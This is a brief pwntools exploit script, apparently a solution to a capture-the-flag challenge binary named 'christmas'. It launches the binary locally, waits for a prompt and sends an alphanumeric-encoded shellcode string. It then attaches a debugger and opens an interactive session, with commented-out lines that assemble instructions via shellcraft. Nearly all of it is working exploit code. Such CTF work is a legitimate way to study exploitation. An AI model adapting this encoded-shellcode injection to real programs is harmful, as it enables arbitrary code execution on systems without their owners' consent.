from pwn import *
context.arch = 'amd64'

#gdb.attach(p)
#f=open('11111','wb')
#f.write(asm(pwnlib.shellcraft.amd64.mov('rax',0x5)))
#f.close()
p = process('./christmas')
p.recvuntil('me how to find it??\n')
payload = '42Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G077O00'
gdb.attach(p)
p.sendline(payload)
#p.sendline()
p.interactive()
